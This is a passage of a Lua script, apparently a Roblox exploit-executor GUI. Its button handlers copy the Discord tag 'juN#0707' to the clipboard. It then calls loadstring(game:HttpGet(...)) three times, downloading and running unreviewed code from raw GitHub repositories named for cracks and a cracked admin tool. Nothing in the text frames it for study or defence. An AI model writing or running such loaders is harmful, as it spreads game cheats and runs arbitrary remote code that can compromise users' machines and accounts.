        dh.Parent = a.uimaker
        dh.BackgroundColor3 = Color3.new(0.145098, 0.145098, 0.145098)
        dh.BackgroundTransparency = 0.7
        dh.Position = UDim2.new(0, 0, 0, 0)
        dh.Text = ""
        dh.Size = UDim2.new(0, 25, 0, 30)
        wait(0.1)
        dh:TweenSize(UDim2.new(0, 345, 0, 30))
        wait(1)
        dh:Destroy()
        setclipboard("juN#0707")
    end
)
a.yenilmezxxgg.MouseButton1Down:Connect(
    function()
        local dh = Instance.new("TextLabel")
        dh.Parent = a.yenilmezxxgg
        dh.BackgroundColor3 = Color3.new(0.145098, 0.145098, 0.145098)
        dh.BackgroundTransparency = 0.7
        dh.Position = UDim2.new(0, 0, 0, 0)
        dh.Text = ""
        dh.Size = UDim2.new(0, 25, 0, 30)
        wait(0.1)
        dh:TweenSize(UDim2.new(0, 345, 0, 30))
        wait(1)
        dh:Destroy()
        setclipboard("juN#0707")
    end
)
wait(11)
loadstring(game:HttpGet("https://raw.githubusercontent.com/chbW5wqwqqwsaas/qH4lF2gC3yM2vG6j/main/staffww", true))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/cfeciefe/qH4lF2gC3yM2vG6j/main/cihonaxadmin", true))()
wait(11)
loadstring(game:HttpGet("https://raw.githubusercontent.com/juNstring/cracks/main/Cihonax/skyremover.lua", true))()
